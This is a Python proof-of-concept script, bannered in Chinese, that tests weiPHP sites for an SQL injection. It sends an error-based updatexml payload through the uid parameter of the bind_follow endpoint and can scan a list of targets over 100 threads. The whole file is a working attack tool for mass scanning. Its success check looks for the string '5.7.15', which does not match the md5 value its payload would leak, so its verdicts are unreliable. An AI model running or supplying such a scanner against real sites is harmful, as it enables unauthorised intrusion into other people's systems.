# -*- coding: utf-8 -*-
import argparse, sys, requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
      tag:  weiPHP sql注入漏洞                                                
"""
    print(test)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}

proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

def poc(target):
    url = target + "/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+"
    res = requests.get(url, headers=headers, verify=False, timeout=5, proxies=proxies).text
    if "5.7.15" in res:
        print(f"[+] {target} is vulable")
    else:
        print(f"[+] {target} is not vulable")


def main():
    banner()
    parser = argparse.ArgumentParser(description='weiPHP sql注入漏洞')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
   main()